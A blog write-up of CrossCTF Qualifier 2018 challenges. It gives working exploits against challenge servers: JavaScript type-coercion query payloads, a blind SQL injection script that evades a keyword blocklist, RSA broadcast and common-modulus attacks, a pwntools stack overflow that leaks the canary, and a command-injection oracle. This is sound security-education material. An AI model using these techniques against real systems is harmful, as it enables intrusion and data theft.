---
title: "Crossctf Qualifier 2018 Writeup"
date: 2018-05-19T13:05:55+08:00
draft: false
tags: [
  "ctf",
  "cyber-security",
  "write-up"
]
description: solves for CrossCTF Qualifier 2018 challenges
---

# QuirkyScript 1

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()

app.get('/flag', function (req, res) {
    if (req.query.first) {
        if (req.query.first.length == 8 && req.query.first == ",,,,,,," ) {
            res.send(flag.flag);
            return;
        }
    }
    res.send("Try to solve this.");
});

app.listen(31337)
```

## Solution


According to the [express.js docs](https://expressjs.com/en/api.html#req.query), `req.query.*` can be an array.

Also, the code used `==` instead of `===`; therefore, values of different types can be equal to each other and types are converted according to [this](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Equality_comparisons_and_sameness):

![equal table](/blog/crossctf-2018-writeup/equal-table.png)

So, when `req.query.first = ['','','','','','','','']`, it has a length of `8` and equals to string `',,,,,,,'`.

Final payload: `http://ctf.pwn.sg:8081/flag?first[0]=&first[1]=&first[2]=&first[3]=&first[4]=&first[5]=&first[6]=&first[7]=&`


Flag: `CrossCTF{C0mm4s_4ll_th3_w4y_t0_th3_fl4g}`

# QuirkyScript 2

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function (req, res) {
  if (req.query.second) {
    if (req.query.second != "1" && req.query.second.length == 10 && req.query.second == true) {
      res.send(flag.flag);
      return;
    }
  }
  res.send("Try to solve this.");
});
app.listen(31337)
```

## Solution

If `req.query.second` equals `'1'` plus nine spaces, the condition with be fulfilled.

Final payload: `http://ctf.pwn.sg:8082/flag?second=1%20%20%20%20%20%20%20%20%20&`

Flag: `CrossCTF{M4ny_w4ys_t0_mak3_4_numb3r}`

# QuirkyScript 3

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()

app.get('/flag', function (req, res) {
    if (req.query.third) {
        if (Array.isArray(req.query.third)) {
            third = req.query.third;
            third_sorted = req.query.third.sort();
            if (Number.parseInt(third[0]) > Number.parseInt(third[1]) && third_sorted[0] == third[0] && third_sorted[1] == third[1]) {
                res.send(flag.flag);
                return;
            }
        }
    }
    res.send("Try to solve this.");
});

app.listen(31337)
```

## Solution

To solve this problem, you need to know how `Array.prototype.sort()` works.

According to the [specs](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/sort): `The default sort order is according to string Unicode code points`; therefore, I just picked `[ '110', '13' ]` which works in this case.

Final payload: `http://ctf.pwn.sg:8083/flag?third[0]=110&third[1]=13`

Flag: `CrossCTF{th4t_r0ck3t_1s_hug3}`

# QuirkyScript 4

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function (req, res) {
  if (req.query.fourth) {
    if (req.query.fourth == 1 && req.query.fourth.indexOf("1") == -1) {
      res.send(flag.flag);
      return;
    }
  }
  res.send("Try to solve this.");
});
app.listen(31337)
```

## Solution

You can have `[['1']]` which meets the requirements.

Final payload: `http://ctf.pwn.sg:8084/flag?fourth[0][0]=1`

Flag: `CrossCTF{1m_g0ing_hungry}`

# QuirkyScript 5

## Problem

```javascript
var flag = require("./flag.js");
var express = require('express')
var app = express()
app.get('/flag', function (req, res) {
  var re = new RegExp('^I_AM_ELEET_HAX0R$', 'g');
  if (re.test(req.query.fifth)) {
    if (req.query.fifth === req.query.six && !re.test(req.query.six)) {
      res.send(flag.flag);
    }
  }
  res.send("Try to solve this.");
});
app.listen(31337)
```

## Solution

```javascript
> var re = new RegExp('^I_AM_ELEET_HAX0R$', 'g');
undefined
> let a = 'I_AM_ELEET_HAX0R'
undefined
> let b = 'I_AM_ELEET_HAX0R'
undefined
> re.test(a)
true
> re.test(b)
false
```

It is just javascript weirdness with it comes to regexp.

Final payload: `http://ctf.pwn.sg:8085/flag?fifth=I_AM_ELEET_HAX0R&six=I_AM_ELEET_HAX0R`

Flag: `CrossCTF{1_am_n1k0las_ray_zhizihizhao}`

# Baby Web

## Problem

```php
...
function getAllUsernameLike($username) {
    $dbhost = 'localhost';
    $dbuser = 'crossctf';
    $dbpass = 'CROSSCTFP@SSW0RDV3RYL0NGANDG00DANDVERYLONG';
    $dbname = 'crossctf';
    $conn = new mysqli($dbhost, $dbuser, $dbpass, $dbname) or die("Wrong info given");
    if ($conn->connect_error) {
        exit();
    }
    $return = array();

    $username = str_replace(" ","", $username);
    $array = array("=", "union", "join", "select", "or", "from", "insert", "delete");
    if(0 < count(array_intersect(array_map('strtolower', explode(' ', $username)), $array)))
    {
        die("die hacker!");
    }
    $sql = "SELECT username FROM users WHERE username like '%$username%';";
    $result = $conn->query($sql);
    while ($row = $result->fetch_array()) {
        array_push($return, $row);
    }
    $conn->close();
    if ( empty($return) ) {
        return null;
    } else {
        return $return;
    }
}
if (isset($_GET['search']) && isset($_POST['username'])) {
    $users = getAllUsernameLike($_POST['username']);
}
...
```

Notes: `The flag is in the flag column of the user 'admin'.`

## Solution

```javascript
const request = require('request-promise');

let flag = '';
let str = 'abcdefghijklmnopqrstuvwxyz!{}ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_';

(async function () {
  while (true) {
    for (let i = 0; i < str.length; i++) {
      let char = str[i]
      let query = "admin%'	and	users.flag	like	binary	'"+flag+char;
      let options = {
        method: 'POST',
        uri: 'http://ctf.pwn.sg:8180/?search',
        form: {
            username: query
        }
      };
      let body = await request(options);
      if (body.indexOf('<tr><td>admin</td></tr>') >= 0) {
        flag += char;
        console.log('got one: ' + query);
        break;
      } else {
        console.log('tried: ' + query);
      }
    }
  }
})();
```

Notes:

* use tabs over spaces
* use `like binary` to find the casing

Flag: `CrossCTF{SiMpLe_sQl_iNjEcTiOn_aS_WaRmUp}`

# BabyRSA

## Problem

Each time I asked for the flag, it gets encoded through RSA. I'm lucky I kept all those values.

[out.txt](/blog/crossctf-2018-writeup/BabyRSA/out.txt)

## Solution

For this challenge, the n values are different and the e values are all the same. This means that we can use the [Chinese Remainder Theorem](https://en.wikipedia.org/wiki/Chinese_remainder_theorem) as described [here](https://www.linkedin.com/pulse/eve-magician-goes-china-crack-rsa-william-buchanan).

Using the CRT, you will be able to find `m^e` which is `m^257`. Then, I used a simple binary search to find the message which is between `10^252` and `10^253`.

Code:

```javascript
const crt_bignum = require('nodejs-chinese-remainder');
const bignum = require('bignum');
const fs = require('fs');
const bigInt = require("big-integer");

const file = fs.readFileSync('./out.txt', 'utf8').split('\n');
const ns = file.filter(e => e.indexOf('n =') >= 0).map(e => bignum(e.substring(4)));
const cs = file.filter(e => e.indexOf('c =') >= 0).map(e => bignum(e.substring(4)));

const result = crt_bignum(cs, ns);
const answer = bigInt(result.toString());

let lower = bigInt(10).pow(252);
let upper = bigInt(10).pow(253);

let target = null;
let v = null;

while (lower.lesser(upper)) {
  target = lower.add(upper).divide(2);
  console.log(target.toString());
  v = target.pow(257);
  if (v.eq(answer)) {
    console.log(target.toString(16));
    break;
  } else if (v.lt(answer)) {
    lower = target;
    console.log('less');
  } else {
    upper = target;
    console.log('more');
  }
}
```

Flag: `crossctf{Ha5tad_ch4ll3nGes_aRe_Gett1ng_b0riNg_n0w_Eh}`

# BabyRSA 2

## Problem

Each time I asked for the flag, it gets encoded through RSA.... again... I'm lucky I kept all those values... AGAIN!

[out.txt](/blog/crossctf-2018-writeup/BabyRSA2/out.txt)

## Solution

This question is the opposite of last one. The n values are the same while the e values are changing. One can use four rounds of the [Extended Euclidean algorithm](https://en.wikipedia.org/wiki/Extended_Euclidean_algorithm) to found `m^(gcd(e1, e2, e3, e4, e5) = 1)` which is the flag. The simplified process is described [here](https://crypto.stackexchange.com/questions/1614/rsa-cracking-the-same-message-is-sent-to-two-different-people-problem).

Proof on a piece of paper:

![proof](/blog/crossctf-2018-writeup/BabyRSA2/proof.jpg)

Code:

```javascript
const bigInt = require("big-integer");
const fs = require('fs');

const ns = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e => e.indexOf('n =') >= 0).map(e => e.substring(4));
const es = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e => e.indexOf('e =') >= 0).map(e => parseInt(e.substring(4)));
const cs = fs.readFileSync('./out.txt', 'utf8').split('\n').filter(e => e.indexOf('c =') >= 0).map(e => bigInt(e.substring(4)));
const n = bigInt(ns[0]);

// ref: http://pages.pacificcoast.net/~cazelais/euclid.html
function xgcd(a,b) { 
  if (b == 0) {
    return [1, 0, a];
  } else {
   temp = xgcd(b, a % b);
   x = temp[0];
   y = temp[1];
   d = temp[2];
   return [y, x-y*Math.floor(a/b), d];
  }
}

function modT(big, a) {
  if (a >= 0) {
    return big.modPow(a, n);
  } else {
    return big.modInv(n).modPow(-a, n);
  }
}

let r1 = xgcd(es[0], es[1]);
console.log(r1);
let r2 = xgcd(es[2], es[3]);
console.log(r2);
let r3 = xgcd(r1[2], r2[2]);
console.log(r3);
let r4 = xgcd(r3[2], es[4]);
console.log(r4);

let v1 = modT(cs[0], r1[0]).times(modT(cs[1], r1[1])).mod(n);
let v2 = modT(cs[2], r2[0]).times(modT(cs[3], r2[1])).mod(n);
let v3 = modT(v1, r3[0]).times(modT(v2, r3[1])).mod(n);
let v4 = modT(v3, r4[0]).times(modT(cs[4], r4[1])).mod(n);
console.log(v4.toString(16));
```

Flag: `crossctf{RSA_Challenges_Are_Too_Easy}`

# Real Baby Pwnable

## Problem

This is an actual baby pwn challenge.

[realbabypwn](/blog/crossctf-2018-writeup/Real-Baby-Pwnable/realbabypwn)

## Solution

Code:

```python
from pwn import *

context.log_level = 'debug'

# sh = process('./realbabypwn')
sh = remote('ctf.pwn.sg', 1500)

print sh.recvuntil('? ')
sh.sendline('289')
canary = sh.recvuntil(') ').split('\n')[0][22:]
canary = int(canary)
print hex(canary)

sh.sendline('y')
print sh.recvuntil('? ')
sh.sendline('291')
pwn = sh.recvuntil(') ').split('\n')[0][22:]
pwn = int(pwn)-482
print hex(pwn)
sh.sendline('n')
print sh.recvuntil('? ')
payload = 'a'*264
payload += p64(canary)
payload += p64(pwn)
payload += p64(pwn)
payload += p64(pwn)
payload += p64(pwn)

sh.send(payload.ljust(0x200, '\x90'))
sh.interactive()
```

Notes:

* Have to leak the stack canary and include it in the payload
* Have to leak a random stack address and calculate the relative offset to the `babymode` (`-482` in this case)

Flag: `CrossCTF{It3r4t1ve_0ver_R3curs1v3}`

# Even Flow

## Problem

Do you like shell command injection?

[evenflow.py](/blog/crossctf-2018-writeup/Even-Flow/evenflow.py)

## Solution

```python
from pwn import *

flag = 'CrossCTF{'

while True:
  sh = remote('ctf.pwn.sg', 1601)
  sh.recvuntil(': ')
  sh.sendline(flag)
  sh.recvuntil(': ')
  sh.sendline('$?')
  flag += chr(int(sh.recvall().split('\n')[0]))
  sh.close()
  print flag
```

Notes:

* `$?` in bash stores the return code of the last command
* `strcmp` returns the next char code or difference

Flag: `CrossCTF{I_just_want_someone_to_say_to_me}`